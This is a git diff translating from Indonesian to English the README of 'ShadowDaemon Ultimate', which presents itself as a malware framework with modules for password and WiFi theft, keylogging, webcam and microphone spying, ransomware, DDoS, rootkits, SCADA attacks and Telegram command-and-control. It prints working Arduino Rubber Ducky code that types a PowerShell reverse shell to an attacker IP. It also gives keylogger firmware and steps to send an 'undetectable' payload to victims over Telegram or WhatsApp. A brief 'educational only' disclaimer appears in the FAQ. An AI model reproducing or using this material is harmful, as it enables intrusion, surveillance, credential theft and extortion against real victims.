@@ -35,7 +35,7 @@
 
 ## 🔥 OVERVIEW
 
-**ShadowDaemon Ultimate** adalah **Malware Framework** lengkap untuk Linux dan Termux (Android). Dengan 30+ modul, lo bisa melakukan berbagai macam serangan dari **Reconnaissance** sampe **Kernel Rootkit** dan **SCADA Exploitation**.
+**ShadowDaemon Ultimate** is a complete **Malware Framework** for Linux and Termux (Android). With 30+ modules, you can perform various attacks ranging from **Reconnaissance** to **Kernel Rootkit** and **SCADA Exploitation**.
 
 ```
 root@shadow:~# whoami
@@ -55,12 +55,12 @@ Linux is freedom. Knowledge is power.
 
 ### ⚡ Key Highlights
 
-- **30+ Modules** - Dari basic sampai advanced
+- **30+ Modules** - From basic to advanced
 - **Multi-C2 Support** - Telegram & Firebase
 - **Persistence Mechanisms** - systemd, cron, rc.local
 - **Kernel-Level Rootkit** - Process hiding
 - **SCADA/ICS Exploitation** - Stuxnet-style
-- **CPU Microcode Injection** - Level paling dalam
+- **CPU Microcode Injection** - Deepest level
 - **Hardware Attacks** - USB keylogger, Rubber Ducky
 - **Cross-Platform** - Linux & Termux (Android)
 
@@ -69,26 +69,26 @@ Linux is freedom. Knowledge is power.
 ## 🎯 FEATURES
 
 ### 🕵️ Reconnaissance
-| Module | Fungsi |
-|--------|--------|
-| `geo_tracker.py` | Lacak lokasi korban via IP |
-| `network_exploiter.py` | Scan jaringan dan discovery |
-| `wifi_stealer.py` | Curi password WiFi |
-| `password_stealer.py` | Curi password browser (Chrome/Firefox) |
-| `shell.py` | Eksekusi perintah shell jarak jauh |
+| Module | Function |
+|--------|----------|
+| `geo_tracker.py` | Track victim location via IP |
+| `network_exploiter.py` | Scan network and discovery |
+| `wifi_stealer.py` | Steal WiFi passwords |
+| `password_stealer.py` | Steal browser passwords (Chrome/Firefox) |
+| `shell.py` | Execute remote shell commands |
 
 ### 🎥 Monitoring & Surveillance
-| Module | Fungsi |
-|--------|--------|
-| `screenshot.py` | Ambil screenshot layar |
-| `webcam.py` | Ambil foto dari webcam |
-| `mic.py` | Rekam suara dari mikrofon |
-| `screen_recorder.py` | Rekam layar (video) |
-| `keylogger.py` | Rekam semua ketikan korban |
+| Module | Function |
+|--------|----------|
+| `screenshot.py` | Take screenshot |
+| `webcam.py` | Capture webcam |
+| `mic.py` | Record microphone |
+| `screen_recorder.py` | Record screen (video) |
+| `keylogger.py` | Record all keystrokes |
 
 ### 💀 Attack Vectors
-| Module | Fungsi |
-|--------|--------|
+| Module | Function |
+|--------|----------|
 | `ssh_bruteforce.py` | SSH Bruteforce |
 | `ddos.py` | DDoS (UDP flood, SYN flood) |
 | `ransomware.py` | Ransomware (AES-256 encryption) |
@@ -96,31 +96,31 @@ Linux is freedom. Knowledge is power.
 | `plc_scada.py` | Industrial protocol flooding |
 
 ### 🔒 Persistence & Evasion
-| Module | Fungsi |
-|--------|--------|
+| Module | Function |
+|--------|----------|
 | `persistence.py` | Auto-start via systemd/cron |
 | `hider.py` | Process hiding (kernel level) |
 | `anti_forensic.py` | Anti-forensic capabilities |
 | `crypter.py` | Binary encryption (FUD) |
 
 ### 🎛️ Advanced Exploitation
-| Module | Fungsi |
-|--------|--------|
+| Module | Function |
+|--------|----------|
 | `bootkit.py` | Bootloader infection (GRUB/Syslinux) |
 | `bios_rootkit.py` | BIOS/UEFI rootkit |
 | `cpu_microcode.py` | CPU microcode patching |
 | `plc_scada.py` | PLC/SCADA attacks (Stuxnet-style) |
 
 ### 🔧 Hardware Attacks
-| Module | Fungsi |
-|--------|--------|
+| Module | Function |
+|--------|----------|
 | `usb_spreader.py` | USB auto-spreader |
 | `hardware_keylogger.py` | Hardware keylogger (Arduino/Teensy) |
 | `usb_rubber_ducky.py` | USB Rubber Ducky payload generation |
 
 ### 📡 C2 Channels
-| Module | Fungsi |
-|--------|--------|
+| Module | Function |
+|--------|----------|
 | `telegram_c2.py` | Telegram Bot C2 |
 | `firebase_c2.py` | Firebase Realtime Database C2 |
 | `dns_tunneling.py` | DNS Tunneling (data exfiltration) |
@@ -414,45 +414,45 @@ tail -f shadow.log
 
 ### Reconnaissance Modules
 
-| Module | File | Fungsi |
-|--------|------|--------|
-| Geolocation | `geo_tracker.py` | Lacak lokasi korban via IP |
-| WiFi Stealer | `wifi_stealer.py` | Curi password WiFi yang tersimpan |
-| Password Stealer | `password_stealer.py` | Curi password dari browser |
-| Network Scanner | `network_exploiter.py` | Scan perangkat di jaringan |
+| Module | File | Function |
+|--------|------|----------|
+| Geolocation | `geo_tracker.py` | Track victim location via IP |
+| WiFi Stealer | `wifi_stealer.py` | Steal stored WiFi passwords |
+| Password Stealer | `password_stealer.py` | Steal passwords from browsers |
+| Network Scanner | `network_exploiter.py` | Scan devices on network |
 
 ### Monitoring Modules
 
-| Module | File | Fungsi |
-|--------|------|--------|
-| Keylogger | `keylogger.py` | Rekam semua ketikan |
-| Screenshot | `screenshot.py` | Ambil screenshot layar |
-| Webcam | `webcam.py` | Ambil foto dari webcam |
-| Microphone | `mic.py` | Rekam suara ruangan |
-| Screen Recorder | `screen_recorder.py` | Rekam layar (video) |
+| Module | File | Function |
+|--------|------|----------|
+| Keylogger | `keylogger.py` | Record all keystrokes |
+| Screenshot | `screenshot.py` | Take screenshot |
+| Webcam | `webcam.py` | Capture webcam image |
+| Microphone | `mic.py` | Record room audio |
+| Screen Recorder | `screen_recorder.py` | Record screen (video) |
 
 ### Attack Modules
 
-| Module | File | Fungsi |
-|--------|------|--------|
-| Ransomware | `ransomware.py` | Enkripsi file dengan AES-256 |
+| Module | File | Function |
+|--------|------|----------|
+| Ransomware | `ransomware.py` | Encrypt files with AES-256 |
 | DDoS | `ddos.py` | UDP flood attack |
 | SSH Bruteforce | `ssh_bruteforce.py` | Bruteforce SSH |
-| Port Knocking | `port_knocking.py` | Buka firewall dengan knock |
+| Port Knocking | `port_knocking.py` | Bypass firewall with knock |
 
 ### Advanced Modules
 
-| Module | File | Fungsi |
-|--------|------|--------|
-| Bootkit | `bootkit.py` | Infect bootloader GRUB/Syslinux |
+| Module | File | Function |
+|--------|------|----------|
+| Bootkit | `bootkit.py` | Infect GRUB/Syslinux bootloader |
 | BIOS Rootkit | `bios_rootkit.py` | Infect BIOS/UEFI |
-| CPU Microcode | `cpu_microcode.py` | Inject backdoor ke CPU |
+| CPU Microcode | `cpu_microcode.py` | Inject backdoor into CPU |
 | PLC/SCADA | `plc_scada.py` | Stuxnet-style SCADA attacks |
 
 ### USB/Hardware Modules
 
-| Module | File | Fungsi |
-|--------|------|--------|
+| Module | File | Function |
+|--------|------|----------|
 | USB Spreader | `usb_spreader.py` | Auto-infect USB |
 | Hardware Keylogger | `hardware_keylogger.py` | Arduino/Teensy keylogger |
 | USB Rubber Ducky | `usb_rubber_ducky.py` | Ducky payload generator |
@@ -461,49 +461,49 @@ tail -f shadow.log
 
 ## 🔌 USB ATTACKS
 
-### Jenis 1: USB Spreader (Software)
-- **TIDAK** butuh USB fisik
-- Malware nyebar otomatis ke USB yang dicolok
+### Type 1: USB Spreader (Software)
+- **NO** physical USB required
+- Malware auto-copies to plugged USB drives
 - Command: `usb_spread`
 
-### Jenis 2: Hardware Keylogger (Fisik)
-- **BUTUH** Arduino/Teensy
-- Rekam ketikan korban diam-diam
+### Type 2: Hardware Keylogger (Physical)
+- **REQUIRES** Arduino/Teensy
+- Records victim keystrokes silently
 - Command: `setup_usb_keylogger`
 
-### Jenis 3: USB Rubber Ducky
-- **BUTUH** Arduino Leonardo / Rubber Ducky
-- Eksekusi payload dalam 5 detik
+### Type 3: USB Rubber Ducky
+- **REQUIRES** Arduino Leonardo / Rubber Ducky
+- Executes payload in 5 seconds
 - Command: `create_ducky:reverse_shell`
 
-### Perbandingan
+### Comparison
 
-| Fitur | USB Spreader | Hardware Keylogger | USB Rubber Ducky |
-|-------|-------------|-------------------|------------------|
-| **Butuh USB Fisik?** | ❌ Tidak | ✅ Ya | ✅ Ya |
-| **Biaya** | Gratis | Rp 50-300 ribu | Rp 30-800 ribu |
-| **Cara Pakai** | Malware jalan | Colok USB | Colok USB |
-| **Fungsi** | Nyebar malware | Rekam ketikan | Eksekusi payload |
-| **Kecepatan** | Pelan | Cepat | Sangat cepat |
+| Feature | USB Spreader | Hardware Keylogger | USB Rubber Ducky |
+|---------|-------------|-------------------|------------------|
+| **Needs Physical USB?** | ❌ No | ✅ Yes | ✅ Yes |
+| **Cost** | Free | Rp 50-300k | Rp 30-800k |
+| **How to Use** | Malware runs | Plug USB | Plug USB |
+| **Function** | Spread malware | Record keystrokes | Execute payload |
+| **Speed** | Slow | Fast | Very Fast |
 
 ---
 
 ## 🔧 ARDUINO SETUP
 
-### 📦 Yang Lo Butuhkan
+### 📦 What You Need
 
-| No | Perangkat | Harga | Fungsi |
-|----|-----------|-------|--------|
-| 1 | Arduino Leonardo | Rp 100-150 ribu | USB Rubber Ducky / Keylogger |
-| 2 | Arduino Nano/Uno | Rp 50-100 ribu | Hardware Keylogger |
-| 3 | DigiSpark | Rp 30-50 ribu | USB Rubber Ducky (murah) |
-| 4 | USB Cable | Rp 10-20 ribu | Koneksi ke PC |
+| No | Device | Price | Function |
+|----|--------|-------|----------|
+| 1 | Arduino Leonardo | Rp 100-150k | USB Rubber Ducky / Keylogger |
+| 2 | Arduino Nano/Uno | Rp 50-100k | Hardware Keylogger |
+| 3 | DigiSpark | Rp 30-50k | USB Rubber Ducky (cheap) |
+| 4 | USB Cable | Rp 10-20k | Connect to PC |
 
 ### 🔧 Setup Arduino IDE
 
 #### Step 1: Download Arduino IDE
 ```bash
-# Download dari website resmi
+# Download from official website
 https://www.arduino.cc/en/software
 
 # Linux (Ubuntu/Debian)
@@ -512,33 +512,33 @@ sudo apt install arduino arduino-core -y
 
 #### Step 2: Install Board Support
 
-**Untuk Arduino Leonardo:**
+**For Arduino Leonardo:**
 ```
 Tools → Board → Boards Manager
-Cari "Arduino AVR Boards" → Install
+Search "Arduino AVR Boards" → Install
 ```
 
-**Untuk DigiSpark:**
+**For DigiSpark:**
 ```
 File → Preferences
-Tambahkan URL:
+Add URL:
 https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json
 
 Tools → Board → Boards Manager
-Cari "Digistump" → Install
+Search "Digistump" → Install
 ```
 
 ---
 
 ### 🦆 Setup USB Rubber Ducky (Arduino Leonardo)
 
-#### Step 1: Generate Payload di Termux
+#### Step 1: Generate Payload in Termux
 ```bash
 create_ducky:reverse_shell
 # Output: ducky_script.txt
 ```
 
-#### Step 2: Convert ke Arduino Code
+#### Step 2: Convert to Arduino Code
 ```cpp
 // USB Rubber Ducky - Arduino Leonardo
 // イズミー Active 😈🔥
@@ -549,14 +549,14 @@ void setup() {
   Keyboard.begin();
   delay(2000);
   
-  // Buka Run (Windows Key + R)
+  // Open Run (Windows Key + R)
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
   delay(100);
   Keyboard.releaseAll();
   delay(500);
   
-  // Ketik perintah
+  // Type command
   Keyboard.println("powershell -Command \"$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"");
   
   delay(100);
@@ -566,34 +566,34 @@ void setup() {
 void loop() {}
 ```
 
-**Ganti `YOUR_IP` dengan IP server lo!**
+**Replace `YOUR_IP` with your server IP!**
 
-#### Step 3: Upload ke Arduino
+#### Step 3: Upload to Arduino
 ```
-1. Colok Arduino Leonardo ke PC via USB
+1. Plug Arduino Leonardo to PC via USB
 2. Tools → Board → Arduino Leonardo
-3. Tools → Port → Pilih COMx (Windows) atau /dev/ttyACM0 (Linux)
-4. Klik Upload (→) icon
-5. Tunggu sampai selesai
+3. Tools → Port → Select COMx (Windows) or /dev/ttyACM0 (Linux)
+4. Click Upload (→) icon
+5. Wait until complete
 ```
 
-#### Step 4: Tes
+#### Step 4: Test
 ```
-Colok Arduino ke PC target
-➜ Dalam 5 detik, malware jalan!
+Plug Arduino into target PC
+➜ Within 5 seconds, malware runs!
 ```
 
 ---
 
 ### ⌨️ Setup Hardware Keylogger (Arduino Nano/Uno)
 
-#### Step 1: Generate Firmware di Termux
+#### Step 1: Generate Firmware in Termux
 ```bash
 setup_usb_keylogger
 # Output: usb_keylogger.ino
 ```
 
-#### Step 2: Upload ke Arduino
+#### Step 2: Upload to Arduino
 ```cpp
 // Hardware Keylogger - Arduino Nano/Uno
 // イズミー Active 😈🔥
@@ -613,7 +613,7 @@ void setup() {
 }
 
 void loop() {
-  // Baca dari serial
+  // Read from serial
   if (mySerial.available()) {
     char c = mySerial.read();
     keylog += c;
@@ -622,7 +622,7 @@ void loop() {
     }
   }
   
-  // Kirim log via serial
+  // Send log via serial
   if (Serial.available()) {
     String cmd = Serial.readString();
     if (cmd == "GET_LOG") {
@@ -635,17 +635,17 @@ void loop() {
 }
 ```
 
-#### Step 3: Upload ke Arduino
+#### Step 3: Upload to Arduino
 ```
-1. Colok Arduino Nano ke PC via USB
+1. Plug Arduino Nano to PC via USB
 2. Tools → Board → Arduino Nano
-3. Tools → Port → Pilih COMx
-4. Klik Upload
+3. Tools → Port → Select COMx
+4. Click Upload
 ```
 
-#### Step 4: Baca Keylog
+#### Step 4: Read Keylog
 ```bash
-# Di Termux
+# In Termux
 python3 -c "
 import serial
 ser = serial.Serial('/dev/ttyUSB0', 9600, timeout=2)
@@ -656,16 +656,16 @@ print(ser.read(ser.in_waiting).decode())
 
 ---
 
-### 💰 Setup DigiSpark (Alternatif Murah)
+### 💰 Setup DigiSpark (Cheap Alternative)
 
 #### Step 1: Install DigiSpark Board
 ```
 File → Preferences
-Tambahkan URL:
+Add URL:
 https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json
 
 Tools → Board → Boards Manager
-Cari "Digistump" → Install
+Search "Digistump" → Install
 ```
 
 #### Step 2: Upload Payload
@@ -689,23 +689,23 @@ void loop() {}
 
 #### Step 3: Upload
 ```
-1. Colok DigiSpark ke PC
+1. Plug DigiSpark to PC
 2. Tools → Board → Digistump AVR Boards → Digispark Default
 3. Tools → Programmer → Micronucleus
-4. Klik Upload
-5. Cabut dan colok lagi untuk trigger
+4. Click Upload
+5. Unplug and replug to trigger
 ```
 
 ---
 
-### 📊 Perbandingan Harga & Fungsi
+### 📊 Price & Function Comparison
 
-| Perangkat | Harga | Fungsi | Kecepatan | Kesulitan |
-|-----------|-------|--------|-----------|-----------|
-| Arduino Leonardo | Rp 100-150k | Rubber Ducky | ⚡ Sangat Cepat | 🟢 Mudah |
-| Arduino Nano | Rp 50-100k | Keylogger | 🐢 Sedang | 🟡 Sedang |
-| DigiSpark | Rp 30-50k | Rubber Ducky | ⚡ Cepat | 🟢 Mudah |
-| USB Rubber Ducky Asli | Rp 500-800k | Rubber Ducky | ⚡ Sangat Cepat | 🟢 Mudah |
+| Device | Price | Function | Speed | Difficulty |
+|--------|-------|----------|-------|------------|
+| Arduino Leonardo | Rp 100-150k | Rubber Ducky | ⚡ Very Fast | 🟢 Easy |
+| Arduino Nano | Rp 50-100k | Keylogger | 🐢 Medium | 🟡 Medium |
+| DigiSpark | Rp 30-50k | Rubber Ducky | ⚡ Fast | 🟢 Easy |
+| USB Rubber Ducky Original | Rp 500-800k | Rubber Ducky | ⚡ Very Fast | 🟢 Easy |
 
 ---
 
@@ -718,30 +718,30 @@ void loop() {}
 gen_payload
 
 # Output: payload_xxxxxx.py
-# File ini sudah di-enkripsi dan FUD (Fully Undetectable)
+# This file is encrypted and FUD (Fully Undetectable)
 ```
 
-### Kirim ke Target
+### Send to Target
 
 ```bash
-# 1. Kirim via Telegram/WhatsApp
-# 2. Target download dan jalankan:
+# 1. Send via Telegram/WhatsApp
+# 2. Target downloads and runs:
 python3 payload_xxxxxx.py
 
-# 3. Malware aktif, lo bisa kontrol dari Telegram!
+# 3. Malware is active, you can control via Telegram!
 ```
 
-### Buat .exe (Windows)
+### Create .exe (Windows)
 
 ```bash
 # Install pyinstaller
 pip install pyinstaller
 
-# Buat .exe
+# Create .exe
 pyinstaller --onefile --noconsole payload_xxxxxx.py
 
-# Hasil: dist/payload_xxxxxx.exe
-# Kirim ke target Windows
+# Result: dist/payload_xxxxxx.exe
+# Send to Windows target
 ```
 
 ---
@@ -775,7 +775,7 @@ Find "chat":{"id": 123456789}
 ### Step 4: Test Bot
 
 ```bash
-curl -X POST "https://api.telegram.org/bot<TOKEN>/sendMessage" -d "chat_id=<CHAT_ID>&text=ShadowDaemon%20aktif!"
+curl -X POST "https://api.telegram.org/bot<TOKEN>/sendMessage" -d "chat_id=<CHAT_ID>&text=ShadowDaemon%20active!"
 ```
 
 ---
@@ -791,14 +791,14 @@ pip install -r requirements.txt
 
 #### Permission Denied (/tmp)
 ```bash
-# Bikin file di folder project
+# Create file in project folder
 touch .shadow_key
 chmod 666 .shadow_key
 ```
 
 #### JSONDecodeError
 ```bash
-# Bikin config.json baru
+# Create new config.json
 cat > config.json << 'EOF'
 {
     "c2_type": "telegram",
@@ -824,23 +824,23 @@ cd kernel && make
 
 ## ❓ FAQ
 
-### Q: Apa itu ShadowDaemon Ultimate?
-**A:** Framework malware lengkap untuk Linux/Termux dengan 30+ modul dari basic hingga kernel rootkit.
+### Q: What is ShadowDaemon Ultimate?
+**A:** A complete malware framework for Linux/Termux with 30+ modules from basic to kernel rootkit.
 
-### Q: Apakah ini ilegal?
-**A:** Ya, jika digunakan tanpa izin. Hanya untuk edukasi dan testing sendiri.
+### Q: Is this illegal?
+**A:** Yes, if used without authorization. For educational and self-testing only.
 
-### Q: Bagaimana cara setup Telegram bot?
-**A:** Cari @BotFather di Telegram, buat bot, copy token, dan dapatkan chat ID dari getUpdates.
+### Q: How to setup Telegram bot?
+**A:** Search @BotFather on Telegram, create bot, copy token, and get chat ID from getUpdates.
 
-### Q: Apakah bisa jalan di Windows?
-**A:** Tidak, khusus Linux. Tapi payload bisa untuk Windows (Rubber Ducky).
+### Q: Can it run on Windows?
+**A:** No, Linux only. But payloads can target Windows (Rubber Ducky).
 
-### Q: Berapa biaya untuk hardware keylogger?
-**A:** Rp 50-300 ribu untuk Arduino/Teensy.
+### Q: How much does hardware keylogger cost?
+**A:** Rp 50-300k for Arduino/Teensy.
 
-### Q: Apakah kernel rootkit berbahaya?
-**A:** Ya, bisa bikin sistem crash atau brick. Hanya untuk testing di lab.
+### Q: Is kernel rootkit dangerous?
+**A:** Yes, can crash or brick the system. Only for lab testing.
 
 ---
 
